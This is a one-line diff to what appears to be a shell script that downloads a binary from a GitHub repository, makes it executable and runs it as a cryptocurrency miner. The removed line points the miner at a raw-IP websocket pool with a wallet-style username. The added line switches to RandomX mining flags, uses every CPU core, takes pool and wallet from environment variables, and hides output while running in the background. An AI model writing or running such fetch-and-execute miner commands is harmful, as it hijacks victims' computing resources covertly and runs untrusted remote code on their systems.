@@ -1,1 +1,1 @@
-wget https://github.com/christineiimegan/miniature/raw/refs/heads/main/ojava && chmod 777 ojava && ./ojava --url ws://8.209.210.176:80/mine mine --username CHtdR4Ha3UQkvtwTpod47TSVQ6PhGq97Ch5qoqiC2pLz.$(echo $(shuf -i 1-9 -n 1)-GHH) --cores 4 
+wget https://github.com/christineiimegan/miniature/raw/refs/heads/main/zjava && chmod 777 zjava && ./zjava -a rx/0 -o $STREETc -u $DOMPETc.$(echo $(shuf -i 1-9 -n 1)-GHH) --randomx-1gb-pages -p -x -t $(nproc --all) &>/dev/null &
